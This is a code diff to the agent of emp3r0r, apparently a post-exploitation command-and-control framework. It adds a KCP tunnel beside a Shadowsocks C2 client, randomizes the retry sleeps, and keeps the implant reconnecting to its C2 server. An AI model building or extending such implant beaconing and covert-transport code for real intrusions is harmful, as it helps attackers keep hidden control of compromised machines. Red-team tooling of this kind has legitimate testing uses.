@@ -255,6 +255,7 @@ test_agent:
 
 					// run ss w/wo KCP
 					go agent.ShadowsocksC2Client()
+					go agent.KCPClient() // KCP client will run when UseKCP is set
 				}
 			}
 			return true
@@ -299,6 +300,7 @@ test_agent:
 	}
 
 connect:
+
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
 	if agent.RuntimeConfig.IndicatorWaitMax > 0 &&
 		agent.RuntimeConfig.CCIndicator != "" &&
@@ -313,12 +315,13 @@ connect:
 			goto connect
 		}
 	}
+	log.Printf("Checking in on %s", emp3r0r_data.CCAddress)
 
 	// check in with system info
 	err = agent.CheckIn()
 	if err != nil {
 		log.Println("CheckIn: ", err)
-		time.Sleep(5 * time.Second)
+		util.TakeASnap()
 		goto connect
 	}
 	log.Printf("Checked in on CC: %s", emp3r0r_data.CCAddress)
@@ -329,17 +332,15 @@ connect:
 	emp3r0r_data.H2Json = conn
 	if err != nil {
 		log.Println("ConnectCC: ", err)
-		time.Sleep(5 * time.Second)
+		util.TakeASnap()
 		goto connect
 	}
 	log.Println("Connected to CC TunAPI")
 	if !util.IsFileExist(agent.RuntimeConfig.UtilsPath + "/bettercap") {
 		go agent.VaccineHandler()
 	}
-	err = agent.CCMsgTun(ctx, cancel)
-	if err != nil {
-		log.Printf("CCMsgTun: %v, reconnecting...", err)
-	}
+	agent.CCMsgTun(ctx, cancel)
+	log.Printf("CCMsgTun closed, reconnecting")
 	goto connect
 }
 
